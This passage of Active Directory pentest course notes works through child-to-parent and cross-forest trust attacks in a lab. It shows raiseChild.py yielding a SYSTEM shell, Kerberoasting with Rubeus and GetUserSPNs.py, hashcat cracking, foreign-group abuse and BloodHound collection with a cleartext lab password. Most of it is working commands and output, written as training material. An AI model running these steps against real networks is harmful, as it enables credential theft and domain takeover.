+[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Found writable share ADMIN$
+[*] Uploading file BnEGssCE.exe
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Starting service UVNb.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>exit
+[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
+[*] Stopping service UVNb.....
+[*] Removing service UVNb.....
+[*] Removing file BnEGssCE.exe.....
+```
+
+**Explanation:**
+- `raiseChild.py` automates the entire child→parent domain escalation in one command.
+- The script's internal workflow (from the source comments):
+  1. Locates the child domain controller via MS-NRPC
+  2. Finds the forest FQDN via MS-NRPC
+  3. Gets the forest's Enterprise Admin SID via MS-LSAT
+  4. Gets the child domain's KRBTGT credentials via MS-DRSR (DCSync)
+  5. Creates a Golden Ticket with the Enterprise Admin SID in the `ExtraSids` array, valid for 10 years
+  6. Logs into the parent forest and retrieves the target user's credentials (Administrator by default)
+  7. If `-w` specified, saves the Golden Ticket as a `.ccache` file
+  8. If `-target-exec` specified, launches a PSExec shell with Enterprise Admin privileges
+- **Opsec warning:** Use `raiseChild.py` carefully in production environments. Always understand the manual process first so you can troubleshoot if the tool fails. Avoid "autopwn" scripts that you cannot fully control — if something breaks, you need to be able to explain what happened to the client.
+
+> **"We don't want to tell the client that something broke because we used an 'autopwn' script!"**
+
+---
+
+# 28. Attacking Domain Trusts — Cross-Forest (Windows)
+
+## 28.1 Introduction
+
+Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed **across trusts**, depending on the trust direction. When positioned in a domain with an inbound or bidirectional domain/forest trust, various attacks can be leveraged to gain a foothold. Sometimes we cannot escalate privileges in our current domain, but can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
+
+---
+
+## 28.2 Cross-Forest Kerberoasting
+
+### Enumerating Accounts for Associated SPNs Using Get-DomainUser
+
+```powershell
+PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+```
+
+**Explanation:**
+- `-SPN` filters for accounts with a Service Principal Name set — candidates for Kerberoasting.
+- `-Domain FREIGHTLOGISTICS.LOCAL` targets the trusted external forest.
+- One account (`mssqlsvc`) has an SPN — worth investigating further.
+
+---
+
+### Enumerating the mssqlsvc Account
+
+```powershell
+PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
+
+samaccountname memberof
+-------------- --------
+mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+```
+
+**Explanation:**
+- `mssqlsvc` is a member of **Domain Admins** in `FREIGHTLOGISTICS.LOCAL`.
+- If we Kerberoast this account and crack the hash offline, we would have full admin rights to the entire target forest — a high-value target.
+
+---
+
+### Performing a Kerberoasting Attack with Rubeus Using /domain Flag
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
+```
+
+**Explanation:**
+- `/domain:FREIGHTLOGISTICS.LOCAL` directs Rubeus to request the TGS ticket from the external forest's DC.
+- `/user:mssqlsvc` targets only this specific account.
+- `/nowrap` prevents line wrapping for easy Hashcat input.
+- The `$krb5tgs$23$...` hash can be cracked offline with Hashcat mode 13100.
+- If cracked, we gain **full Domain Admin access** to `FREIGHTLOGISTICS.LOCAL` by leveraging a bidirectional forest trust and a standard Kerberoasting attack.
+
+---
+
+## 28.3 Admin Password Re-Use and Foreign Group Membership
+
+### Admin Password Re-Use
+
+In a bidirectional forest trust managed by admins from the same company, if we take over Domain A and obtain cleartext passwords or NT hashes for a highly privileged account, it is worth checking for **password re-use** across the trust. For example:
+- Domain A has `adm_bob.smith` in Domain Admins
+- Domain B has `bsmith_admin` — same password
+
+Owning Domain A could instantly give full admin rights to Domain B. Always check for password re-use across similarly named accounts in different domains and report any findings.
+
+### Foreign Group Membership
+
+Only **Domain Local Groups** allow security principals from outside a forest. It is not uncommon to see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust. Taking over that admin user in Domain A grants full administrative access to Domain B based on group membership alone.
+
+### Using Get-DomainForeignGroupMember
+
+```powershell
+PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL
+
+PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+
+INLANEFREIGHT\administrator
+```
+
+**Explanation:**
+- `Get-DomainForeignGroupMember` enumerates all groups in the target domain that contain members from **outside the domain** (foreign group membership).
+- The output shows the built-in **Administrators** group in `FREIGHTLOGISTICS.LOCAL` contains a member with SID `S-1-5-21-3842939050-3880317879-2865463114-500`.
+- `Convert-SidToName` resolves that SID to `INLANEFREIGHT\administrator` — the built-in Administrator of `INLANEFREIGHT.LOCAL` is a member of the Administrators group in the external forest.
+- This means controlling `INLANEFREIGHT\administrator` grants full admin access to `FREIGHTLOGISTICS.LOCAL`.
+
+---
+
+### Accessing DC03 Using Enter-PSSession
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
+
+**Explanation:**
+- `Enter-PSSession` uses the `INLANEFREIGHT\administrator` credential to authenticate to the DC in the `FREIGHTLOGISTICS.LOCAL` domain across the bidirectional forest trust.
+- `whoami` confirms `inlanefreight\administrator` — authenticated as the INLANEFREIGHT admin.
+- `ipconfig /all` confirms we are on `ACADEMY-EA-DC03` in the `FREIGHTLOGISTICS.LOCAL` domain.
+- This is a **quick win** after taking control of a domain — always check for foreign group membership when a bidirectional forest trust is present and the second forest is in scope.
+
+---
+
+## 28.4 SID History Abuse — Cross Forest
+
+SID History can also be abused **across a forest trust** if SID Filtering is not enabled. If a user migrated from Forest A to Forest B has the SID of a privileged account in Forest A added to their `sidHistory`, that SID is added to their token when authenticating across the trust — granting those privileges in the partner forest. For example, if `jjones` is migrated from `INLANEFREIGHT.LOCAL` to `CORP.LOCAL` and had admin rights in `INLANEFREIGHT.LOCAL`, those rights are retained in `INLANEFREIGHT.LOCAL` even after migration, if SID filtering is not enforced. This attack is a powerful persistence mechanism, especially in M&A scenarios where two forests are merged without proper security review.
+
+> This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.
+
+---
+
+# 29. Attacking Domain Trusts — Cross-Forest (Linux)
+
+As seen in the previous section, it is often possible to Kerberoast across a forest trust. We can perform this from a Linux host using `GetUserSPNs.py`. We need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag.
+
+---
+
+## 29.1 Cross-Forest Kerberoasting with GetUserSPNs.py
+
+### Using GetUserSPNs.py (Enumerate SPNs)
+
+```bash
+$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
+```
+
+**Explanation:**
+- `-target-domain FREIGHTLOGISTICS.LOCAL` specifies the trusted external forest to enumerate.
+- `INLANEFREIGHT.LOCAL/wley` provides credentials from our current domain.
+- The output confirms `mssqlsvc` has an SPN and is a member of **Domain Admins** in `FREIGHTLOGISTICS.LOCAL` — a prime Kerberoasting target.
+
+---
+
+### Using the -request Flag (Retrieve the Hash)
+
+```bash
+$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
+
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
+```
+
+**Explanation:**
+- `-request` fetches the actual TGS ticket hash for offline cracking.
+- `-outputfile <FILE>` can be added to save the hash directly to a file for Hashcat.
+- Crack with Hashcat mode 13100: `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`.
+- If cracked, we can authenticate into `FREIGHTLOGISTICS.LOCAL` as a Domain Admin.
+
+> **Post-crack steps:** After cracking the hash, check if the account exists in the current domain with the same name and suffers from **password re-use** — a quick win if not yet escalated in the current domain. Even if already in control of the current domain, add a finding to the report if password re-use is confirmed across domains. Also consider a **password spray** with the cracked password against other service accounts in case the same admins manage both domains. This is iterative testing — leave no stone unturned.
+
+---
+
+## 29.2 Hunting Foreign Group Membership with BloodHound-Python
+
+From a Linux host, we can gather foreign group membership data using the Python implementation of BloodHound across multiple domains, ingest it into the GUI, and search for cross-forest relationships.
+
+On some assessments a client-provisioned VM will already have DNS configured. In other cases the attack host has no DNS configured and we must edit `/etc/resolv.conf` manually, since bloodhound-python requires DNS hostnames for Domain Controllers (not just IPs).
+
+---
+
+### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+
+```bash
+$ cat /etc/resolv.conf
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+**Explanation:**
+- Comment out the existing `nameserver` entries and add the target domain name and DC IP.
+- `domain INLANEFREIGHT.LOCAL` sets the default domain for DNS lookups.
+- `nameserver 172.16.5.5` points to the INLANEFREIGHT Domain Controller for name resolution.
+
+---
+
+### Running bloodhound-python Against INLANEFREIGHT.LOCAL
+
+```bash
+$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 559 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01
+INFO: Found 2950 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+
+<SNIP>
+```
+
+**Explanation:**
+- `-d INLANEFREIGHT.LOCAL` — target domain.
+- `-dc ACADEMY-EA-DC01` — Domain Controller hostname (requires DNS resolution).
+- `-c All` — collect all data types: users, groups, computers, GPOs, trusts, sessions, ACLs.
+- Output shows 559 computers, 2950 users, 183 groups, and 2 trusts discovered.
+
+---
+
+### Compressing the File with zip -r
+
+```bash
+$ zip -r ilfreight_bh.zip *.json
+
+  adding: 20220329140127_computers.json (deflated 99%)
+  adding: 20220329140127_domains.json (deflated 82%)
+  adding: 20220329140127_groups.json (deflated 97%)
+  adding: 20220329140127_users.json (deflated 98%)
+```
+
+**Explanation:**
+- Compresses all four JSON output files (computers, domains, groups, users) into a single zip for uploading to the BloodHound GUI.
+
+---
+
+### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+
+```bash
+$ cat /etc/resolv.conf
+
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+```
+
+**Explanation:**
+- Update `/etc/resolv.conf` again, this time pointing to the `FREIGHTLOGISTICS.LOCAL` domain and its DC (`172.16.5.238`) for the second data collection run.
+
+---
+
+### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
+
+```bash
+$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
+INFO: Found AD domain: freightlogistics.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 5 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 9 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+INFO: Found 52 groups
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+```
+
+**Explanation:**
+- `-dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL` — specifies the FQDN of the external forest's DC.
+- `-u forend@inlanefreight.local` — authenticate using the full UPN format (domain\user or user@domain) to cross into the external forest with our current domain credentials.
+- The external forest has 5 computers, 9 users, 52 groups, and 1 trust — a much smaller environment.
+- Zip this second batch of JSON files and upload to BloodHound alongside the first batch.
+
+---
+
+### Viewing Dangerous Rights through BloodHound
+
+After uploading both sets of data into the BloodHound GUI:
+1. Click the **Analysis** tab.
+2. Select **Users with Foreign Domain Group Membership**.
+3. Set the source domain to `INLANEFREIGHT.LOCAL`.
+4. The result shows `ADMINISTRATOR@INLANEFREIGHT.LOCAL` is a member of `ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL` — confirming the foreign group membership found manually with PowerView in the previous section.
+
+This is a significant finding: any attacker who compromises `INLANEFREIGHT\administrator` gains full admin access to `FREIGHTLOGISTICS.LOCAL` by virtue of group membership across the bidirectional forest trust.
+
+---
+
+## 29.3 Closing Thoughts on Domain Trusts
+
+As seen across the trust attack sections, there are several ways to leverage domain trusts to gain additional access and perform "end-around" privilege escalation:
+
+- **Take over a trusted domain** and find password re-use across privileged accounts.
+- **Child domain compromise** almost always leads to parent domain compromise via the ExtraSids / Golden Ticket attack.
+- **Cross-forest Kerberoasting** can yield Domain Admin credentials in a trusted forest.
+- **Foreign group membership** can give instant admin access to a trusted forest without any exploitation.
+- **SID History abuse** can provide persistent access across forest boundaries when SID filtering is not enforced.
+
+Domain trusts are a large and complex topic. The techniques in this module provide foundational tools for enumerating trusts and performing standard intra-forest and cross-forest attacks. More advanced trust attacks will be covered in-depth in dedicated later modules.
+
+---
+
+*End of Active Directory Security Notes*
+
+---
+
+> **Study Tip:** The attack chains in this module follow a logical progression: ACL enumeration → ACL abuse → DCSync → privileged access → trust attacks. Understanding each step and its dependencies is key to applying these techniques during real assessments.
+
